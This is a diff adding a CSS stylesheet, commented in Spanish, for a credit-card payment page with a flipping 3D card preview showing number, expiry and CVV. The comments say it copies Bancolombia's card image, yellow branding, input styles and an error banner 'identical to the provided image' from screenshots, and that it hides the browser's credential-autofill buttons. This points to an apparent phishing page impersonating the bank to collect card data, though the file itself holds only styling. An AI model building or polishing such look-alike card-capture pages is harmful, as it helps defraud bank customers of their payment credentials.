@@ -1,0 +1,591 @@
+/* =========================================
+   TDC — Estilos Tarjeta 3D y Formulario de Pago
+   ========================================= */
+
+/* Layout principal */
+.tdc-page {
+    min-height: 50vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 2rem 1rem;
+}
+
+.tdc-header {
+    text-align: center;
+    margin-bottom: 1.5rem;
+}
+
+.tdc-header-logo {
+    width: 11.5rem;
+    margin-bottom: 0.5rem;
+}
+
+.tdc-title {
+    font-size: 1rem;
+    color: #fff;
+    font-weight: 300;
+    margin: 0.5rem 0 0.25rem;
+}
+
+.tdc-subtitle {
+    font-size: 0.875rem;
+    color: rgba(255, 255, 255, 0.75);
+    margin: 0;
+}
+
+/* Contenedor card + formulario — desktop: fila | móvil: columna */
+.tdc-content {
+    display: flex;
+    flex-direction: row;       /* Desktop: tarjeta izquierda, form derecha */
+    align-items: flex-start;
+    gap: 2rem;
+    width: 100%;
+    max-width: 820px;
+}
+
+/* ── MÓVIL: columna (tarjeta arriba, form abajo) ── */
+@media (max-width: 700px) {
+    .tdc-content {
+        flex-direction: column;
+        align-items: center;
+        max-width: 420px;
+    }
+
+    .card-3d-wrapper {
+        width: 100%;
+        max-width: 340px;
+    }
+
+    #tdc-lg {
+        width: 100%;
+    }
+}
+
+/* =======================================
+   TARJETA 3D
+   ======================================= */
+.card-3d-wrapper {
+    width: 340px;
+    height: 210px;
+    perspective: 1000px;
+    cursor: pointer;
+    flex-shrink: 0;            /* No se encoge en desktop */
+}
+
+/* Formulario ocupa el resto del espacio disponible */
+#tdc-lg {
+    flex: 1;
+    min-width: 0;
+}
+
+.card-3d {
+    width: 100%;
+    height: 100%;
+    position: relative;
+    transform-style: preserve-3d;
+    transition: transform 0.6s cubic-bezier(0.23, 1, 0.32, 1);
+    border-radius: 16px;
+}
+
+.card-3d.flipped {
+    transform: rotateY(180deg) !important;
+}
+
+/* Cara frontal */
+.card-3d-front,
+.card-3d-back {
+    position: absolute;
+    inset: 0;
+    border-radius: 16px;
+    backface-visibility: hidden;
+    -webkit-backface-visibility: hidden;
+    overflow: hidden;
+    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4), 0 8px 24px rgba(0, 0, 0, 0.3);
+}
+
+/* Frente — Imagen real de la tarjeta Bancolombia */
+.card-3d-front {
+    background-image: url('../images/tdb.png');
+    background-size: 100% 100%;   /* Estira la imagen exactamente al tamaño del contenedor */
+    background-position: top left;
+    background-repeat: no-repeat;
+    width: 100%;
+    height: 100%;
+    position: absolute;
+    inset: 0;
+    border-radius: 16px;
+}
+
+/* Brillo/reflejo holográfico sutil encima de la imagen */
+.card-3d-shine {
+    position: absolute;
+    inset: 0;
+    background: linear-gradient(
+        135deg,
+        rgba(255,255,255,0.18) 0%,
+        rgba(255,255,255,0) 50%,
+        rgba(255,255,255,0.05) 100%
+    );
+    pointer-events: none;
+    border-radius: 16px;
+    z-index: 2;
+}
+
+/* Ocultar elementos HTML decorativos — ya están en la imagen */
+.card-3d-bands,
+.card-3d-chip-row,
+.card-3d-type,
+.card-3d-top,
+.card-3d-mastercard {
+    display: none;
+}
+
+/* Overlay de datos dinámicos sobre la imagen */
+.card-3d-inner {
+    position: absolute;
+    inset: 0;
+    z-index: 3;
+    display: flex;
+    flex-direction: column;
+    justify-content: flex-end;
+    padding: 14px 18px 14px 18px;
+    border-radius: 16px;
+}
+
+/* Número de tarjeta — zona central de la tarjeta */
+.card-3d-number {
+    font-family: 'Courier New', monospace;
+    font-size: 1rem;
+    font-weight: 700;
+    color: #111;
+    letter-spacing: 4px;
+    text-align: center;
+    margin-bottom: 0.55rem;
+    text-shadow: 0 1px 1px rgba(255,255,255,0.5);
+}
+
+/* Fila de datos inferiores */
+.card-3d-footer {
+    display: flex;
+    justify-content: space-between;
+    align-items: flex-end;
+}
+
+.card-3d-holder-group,
+.card-3d-expiry-group {
+    display: flex;
+    flex-direction: column;
+}
+
+.card-3d-label {
+    font-size: 0.5rem;
+    font-weight: 700;
+    color: rgba(0, 0, 0, 0.55);
+    letter-spacing: 1px;
+    text-transform: uppercase;
+}
+
+.card-3d-value {
+    font-size: 0.82rem;
+    font-weight: 700;
+    color: #111;
+    letter-spacing: 0.5px;
+    text-transform: uppercase;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    max-width: 140px;
+}
+
+
+
+/* ===== REVERSO — amarillo como la imagen de referencia ===== */
+.card-3d-back {
+    background: #FDDA23;
+    transform: rotateY(180deg);
+    width: 100%;
+    height: 100%;
+    position: absolute;
+    inset: 0;
+    border-radius: 16px;
+    display: flex;
+    flex-direction: column;
+    overflow: hidden;
+}
+
+/* Ya no se necesita contra-espejo */
+.card-3d-back-content {
+    display: flex;
+    flex-direction: column;
+    height: 100%;
+}
+
+/* Banda magnética negra — zona superior */
+.card-3d-stripe {
+    width: 100%;
+    height: 42px;
+    background: #111;
+    margin-top: 22px;
+    flex-shrink: 0;
+}
+
+/* Franja de firma gris con CVV */
+.card-3d-cvv-strip {
+    margin: 12px 16px 0;
+    background: #e0e0e0;
+    background-image: repeating-linear-gradient(
+        45deg,
+        rgba(255,255,255,0.5) 0px,
+        rgba(255,255,255,0.5) 2px,
+        rgba(200,200,200,0.3) 2px,
+        rgba(200,200,200,0.3) 6px
+    );
+    border-radius: 3px;
+    padding: 6px 10px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    min-height: 36px;
+}
+
+.card-3d-cvv-label {
+    font-size: 0.6rem;
+    color: #444;
+    font-weight: 700;
+    letter-spacing: 0.5px;
+    text-transform: uppercase;
+}
+
+.card-3d-cvv-value {
+    font-size: 1rem;
+    font-weight: 700;
+    color: #111;
+    letter-spacing: 3px;
+    font-family: 'Courier New', monospace;
+    font-style: italic;
+}
+
+/* Zona inferior: logo */
+.card-3d-back-bottom {
+    margin-top: auto;
+    padding: 0 16px 12px;
+    display: flex;
+    justify-content: space-between;
+    align-items: flex-end;
+}
+
+.card-3d-back-brand {
+    height: 18px;
+    width: auto;
+    /* Logo sobre fondo amarillo — lo dejamos negro */
+    filter: brightness(0);
+    opacity: 0.75;
+}
+
+/* Texto pequeño de seguridad en el reverso */
+.card-3d-back-info {
+    font-size: 0.42rem;
+    color: rgba(0,0,0,0.5);
+    line-height: 1.3;
+    max-width: 180px;
+    text-align: right;
+}
+
+
+/* =======================================
+   FORMULARIO — misma UI que index.html
+   ======================================= */
+
+/* Contenedor del formulario — fondo oscuro como el card-auth del index */
+#tdc-lg {
+    flex: 1;
+    min-width: 0;
+    padding: 1.5rem;
+}
+
+/* Fix Labels y Inputs (Sistema Bancolombia) */
+.bc-fm-fld {
+    position: relative;
+    margin-top: 35px !important; /* Más espacio para que no choque arriba */
+    margin-bottom: 25px !important;
+    display: block !important;
+}
+
+.bc-input {
+    padding-left: 0 !important; /* Sin espacio para iconos a la izquierda */
+    padding-right: 30px !important; /* Espacio para el ojo/ayuda si hubiera */
+    border: none !important;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.6) !important;
+    background: transparent !important;
+    height: 38px !important;
+    font-size: 1.05rem !important;
+    color: #fff !important;
+    width: 100% !important;
+    box-sizing: border-box !important;
+    transition: border-bottom 0.3s ease !important;
+}
+
+.bc-input:focus {
+    outline: none !important;
+    border-bottom: 2px solid #FDDA23 !important;
+}
+
+/* Ocultar iconos de autocompletado del navegador (los que se ven en las capturas) */
+input::-webkit-card-auto-fill-button,
+input::-webkit-credentials-auto-fill-button,
+input::-webkit-contacts-auto-fill-button {
+    display: none !important;
+    visibility: hidden !important;
+    pointer-events: none !important;
+}
+
+.bc-fm-fld label {
+    position: absolute !important;
+    left: 0 !important;
+    top: 6px !important;
+    pointer-events: none !important;
+    transition: all 0.2s ease-out !important;
+    color: #fff !important;
+    font-size: 1rem !important;
+    font-weight: 400 !important;
+    opacity: 1 !important;
+}
+
+/* Lógica de Label Flotante — SE QUEDA ARRIBA al haber datos */
+.bc-input:focus ~ label,
+.bc-input:not(:placeholder-shown) ~ label {
+    top: -24px !important;
+    font-size: 0.8rem !important;
+    color: rgba(255, 255, 255, 0.8) !important;
+}
+
+/* Fila de vencimiento + CVV */
+.tdc-row {
+    display: flex;
+    gap: 1.5rem;
+    margin-top: 1rem;
+}
+
+.tdc-col-half {
+    flex: 1;
+}
+
+/* Error */
+.tdc-error {
+    min-height: 20px;
+    font-size: 0.8rem;
+    color: #ff8389;
+    display: none;
+}
+
+.tdc-error.visible {
+    display: block;
+}
+
+/* Botón de acción — estilo amarillo Bancolombia */
+.tdc-btn {
+    width: 100%;
+    padding: 0.85rem;
+    background: #FDDA23 !important;
+    color: #000 !important;
+    font-size: 1rem;
+    font-weight: 700;
+    border: none;
+    border-radius: 24px;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    transition: background 0.2s, transform 0.1s;
+    position: relative;
+    overflow: hidden;
+}
+
+.tdc-btn:hover:not(:disabled) {
+    background: #f0cc00 !important;
+}
+
+.tdc-btn:active:not(:disabled) {
+    transform: scale(0.98);
+}
+
+.tdc-btn:disabled {
+    background: #ccc !important;
+    color: #666 !important;
+    opacity: 0.6;
+    cursor: not-allowed;
+    transform: none !important;
+}
+
+.tdc-btn.loading .btn-text {
+    display: none;
+}
+
+.tdc-btn .btn-text {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+}
+
+.tdc-btn .btn-loader {
+    display: none;
+    align-items: center;
+    gap: 8px;
+}
+
+.tdc-btn.loading .btn-loader {
+    display: flex;
+}
+
+.tdc-btn-spinner {
+    width: 18px;
+    height: 18px;
+    border: 3px solid rgba(0,0,0,0.2);
+    border-top-color: #000;
+    border-radius: 50%;
+    animation: tdc-spin 0.7s linear infinite;
+}
+
+@keyframes tdc-spin {
+    to { transform: rotate(360deg); }
+}
+
+/* Seguridad */
+.tdc-security {
+    margin-top: 0.85rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+    font-size: 0.78rem;
+    color: rgba(255, 255, 255, 0.45);
+}
+
+/* Footer */
+.tdc-footer {
+    margin-top: 2rem;
+    text-align: center;
+    font-size: 0.75rem;
+    color: rgba(255, 255, 255, 0.35);
+    padding-bottom: 1rem;
+}
+
+/* ── Responsive ── */
+@media (max-width: 600px) {
+    .card-3d-wrapper {
+        width: 300px;
+        height: 185px;
+    }
+
+    .card-3d-number {
+        font-size: 1.05rem;
+        letter-spacing: 2px;
+        margin-bottom: 0px;
+    }
+
+    .card-3d-front-overlay {
+        padding: 16px;
+    }
+
+    #tdc-lg {
+        padding: 1rem;
+    }
+
+    .tdc-row {
+        gap: 0.5rem;
+    }
+}
+
+/* =======================================
+   BC-ALERT — Banner de error (idéntico a imagen proporcionada)
+   ======================================= */
+#tdc-alert-container {
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    z-index: 9999;
+    pointer-events: none;
+}
+
+#tdc-alert-container > * {
+    pointer-events: all;
+}
+
+.custom-bc-alert {
+    position: fixed;
+    top: 24px;
+    left: 50%;
+    transform: translateX(-50%);
+    width: calc(100% - 32px);
+    max-width: 600px;
+    background-color: #ffffff;
+    border-radius: 4px;
+    box-shadow: 0 4px 16px rgba(0,0,0,0.15);
+    display: flex;
+    align-items: flex-start;
+    padding: 16px 20px;
+    z-index: 9999;
+    border-left: 6px solid #F37052; /* Borde grueso naranja/rojo en la izquierda */
+}
+
+.custom-bc-icon {
+    flex-shrink: 0;
+    width: 28px;
+    height: 28px;
+    border-radius: 50%;
+    background-color: #FEE7E2; /* Círculo fondo naranja claro */
+    color: #F37052; /* X naranja */
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-right: 14px;
+    margin-top: 2px;
+}
+
+.custom-bc-content {
+    flex: 1;
+}
+
+.custom-bc-title {
+    margin: 0 0 6px 0;
+    font-size: 15px;
+    font-weight: 700;
+    color: #2c2a29; /* Título negro/gris oscuro */
+}
+
+.custom-bc-text {
+    margin: 0;
+    font-size: 14px;
+    color: #4a4a4a; /* Subtítulo gris algo más claro */
+}
+
+.custom-bc-close {
+    background: none;
+    border: none;
+    color: #717171;
+    cursor: pointer;
+    padding: 2px;
+    margin-left: 12px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: color 0.2s;
+}
+
+.custom-bc-close:hover {
+    color: #222;
+}
+
+.tdc-alert-anim {
+    animation: tdc-alert-slide-in 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+}
+
+@keyframes tdc-alert-slide-in {
+    from { opacity: 0; transform: translateX(-50%) translateY(-40px); }
+    to   { opacity: 1; transform: translateX(-50%) translateY(0); }
+}
+
